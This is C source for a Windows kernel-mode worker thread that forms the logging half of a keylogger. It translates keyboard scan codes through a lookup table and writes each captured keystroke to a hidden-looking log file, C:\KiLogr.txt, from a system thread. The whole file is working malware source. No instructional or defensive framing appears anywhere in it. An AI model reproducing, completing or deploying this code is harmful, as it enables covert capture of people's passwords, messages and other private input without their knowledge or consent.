#include "string.h"
#include "ntddk.h"
#include "ntddkbd.h"
#include "types.h"
#include "WorkerThread.h"



#define SZ_TABLE 0x53

const char* table[SZ_TABLE] =
{
	"[INVALID]",
	"'",
	"1",
	"2",
	"3",
	"4",
	"5",
	"6",
	"7",
	"8",
	"9",
	"0",
	"-",
	"=",
	"[BACKSPACE]",
	"[INVALID]",
	"q",
	"w",
	"e",
	"r",
	"t",
	"y",
	"u",
	"i",
	"o",
	"p",
	"[",
	"]",
	"[ENTER]",
	"[CTRL]",
	"a",
	"s",
	"d",
	"f",
	"g",
	"h",
	"j",
	"k",
	"l",
	";",
	"\'",
	"`",
	"[LSHIFT]",
	"\\",
	"z",
	"x",
	"c",
	"v",
	"b",
	"n",
	"m",
	",",
	".",
	"/",
	"[RSHIFT]",
	"[INVALID]",
	"[ALT]",
	"[SPACE]",
	"[INVALID]",
	"[INVALID]",
	"[INVALID]",
	"[INVALID]",
	"[INVALID]",
	"[INVALID]",
	"[INVALID]",
	"[INVALID]",
	"[INVALID]",
	"[INVALID]",
	"[INVALID]",
	"[INVALID]",
	"[INVALID]",
	"7",
	"8",
	"9",
	"[INVALID]",
	"4",
	"5",
	"6",
	"[INVALID]",
	"1",
	"2",
	"3",
	"0",
};








WORKER_THREAD workerThread;


NTSTATUS initWorkerThread()
{
	NTSTATUS status;

	status = PsCreateSystemThread(
		&workerThread.threadHandle,
		(ACCESS_MASK)0,
		NULL,
		(HANDLE)0,
		NULL,
		threadMain,
		NULL
	);

	if (!NT_SUCCESS(status))
	{
		DbgPrint("[%s]: %s\n", "initWorkerThread", "PsCreateSystemThread() failed");
		return status;
	}

	//need an object reference to thread for destruction routine
	status = ObReferenceObjectByHandle(
		workerThread.threadHandle,
		THREAD_ALL_ACCESS,
		NULL,
		KernelMode,
		&workerThread.threadObjPtr,
		NULL
	);

	if (!NT_SUCCESS(status))
	{
		DbgPrint("[%s]: %s\n", "initWorkerThread", "ObReferenceObjectByHandle() failed");
		return status;
	}

	//keeps the thread's main processing loop alive
	workerThread.keepRunning = TRUE;

	initLogFile();

	return STATUS_SUCCESS;
}/*end initWorkerThread()-------------------------------------------------------------------------------------------------------------*/




void initLogFile()
{
	/*
	creates a text file to log keystrokes
	*/

	CCHAR				fileName[32] = "\\DosDevices\\C:\\KiLogr.txt";
	STRING				fileNameString;
	UNICODE_STRING		unicodeFileNameString;

	IO_STATUS_BLOCK		ioStatus;
	OBJECT_ATTRIBUTES	attributes;
	NTSTATUS			status;

	RtlInitAnsiString(&fileNameString, fileName);
	RtlAnsiStringToUnicodeString(&unicodeFileNameString, &fileNameString, TRUE);

	InitializeObjectAttributes(
		&attributes,
		&unicodeFileNameString,
		OBJ_CASE_INSENSITIVE,
		NULL,
		NULL
	);

	status = ZwCreateFile(
		&(workerThread.logfile),
		GENERIC_WRITE,
		&attributes,
		&ioStatus,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		0,
		FILE_OPEN_IF,
		FILE_SYNCHRONOUS_IO_NONALERT,
		NULL,
		0
	);

	RtlFreeUnicodeString(&unicodeFileNameString);

	if (!NT_SUCCESS(status))
	{
		workerThread.logfile = NULL;
	}

	return;
}/*end initLogFile()-------------------------------------------------------------------------------------------------------------*/








void writeToLog(DWORD nElements)
{
	BYTE writeBuffer[SZ_SHARED_ARRAY*20];
	DWORD i;

	KEYBOARD_INPUT_DATA keyData;
	USHORT				code;
	USHORT				flags;

	//convert stream of scan code into an ASCII string
	writeBuffer[0] = '\0';
	for (i = 0; i < nElements; i++)
	{
		keyData = workerThread.buffer[i];
		code = (workerThread.buffer[i]).MakeCode;
		flags = (workerThread.buffer[i]).Flags;

		if ((code >= 0) && (code < SZ_TABLE))
			strcat(writeBuffer, table[code]);

		else
			strcat(writeBuffer, "[-NA-]");

		if (flags == KEY_MAKE)
			strcat(writeBuffer, "\t\tPressed\r\n");
	}

	//write ASCII string to the log file
	if (workerThread.logfile != NULL)
	{
		NTSTATUS status;
		IO_STATUS_BLOCK ioStatus;

		status = ZwWriteFile(
			workerThread.logfile,
			NULL,
			NULL,
			NULL,
			&ioStatus,
			writeBuffer,
			strlen(writeBuffer),
			NULL,
			NULL
		);

		if (!NT_SUCCESS(status))
			DbgPrint("[%s]: ZwWriteFile() Failed, ntStatus =  %X", "writeToLog", status);
	}

	return;
}/*end writeToLog()--------------------------------------------------------------------------------------------------------------*/








void destroyWorkerThread()
{
	//Close the handle
	ZwClose(workerThread.threadHandle);

	//Remove keep-alive switch (allows thread to terminate itself)
	workerThread.keepRunning = FALSE;

	//Block current thread until the worker thread terminates
	KeWaitForSingleObject(
		workerThread.threadObjPtr,
		Executive,
		KernelMode,
		FALSE,
		NULL
	);

	//Close log file
	ZwClose(workerThread.logfile);

	return;
}/*end destroyWorkerThread()-------------------------------------------------------------------------------------------------------------*/














VOID threadMain(IN PVOID pContext)
{
	/*
	inifinite loop, checks to see if shared buffer has enough entries to warrant a disk I/O operation.
	also checks 'keepRunning' field to see if should quit
	*/

	while (TRUE)
	{
		if (workerThread.keepRunning == FALSE)
		{
			DWORD nElements;
			DbgPrint("[%s]: %s\n", "threadMain", "harvesting remainder of buffer");
			nElements = dumpArray(workerThread.buffer);
			DbgPrint("[%s]: Elements dumped = %d\n", "threadMain", nElements);

			writeToLog(nElements);

			DbgPrint("[%s]: %s\n", "threadMain", "worker terminating");
			PsTerminateSystemThread(STATUS_SUCCESS);
		}

		if (isBufferReady() == TRUE)
		{
			DWORD nElements;
			DbgPrint("[%s]: %s\n", "threadMain", "buffer is ready to be harvested");
			nElements = dumpArray(workerThread.buffer);
			DbgPrint("[%s]: Elements dumped = %d\n", "threadMain", nElements);

			writeToLog(nElements);
		}
	}

	return;
}/*end threadMain()-------------------------------------------------------------------------------------------------------------*/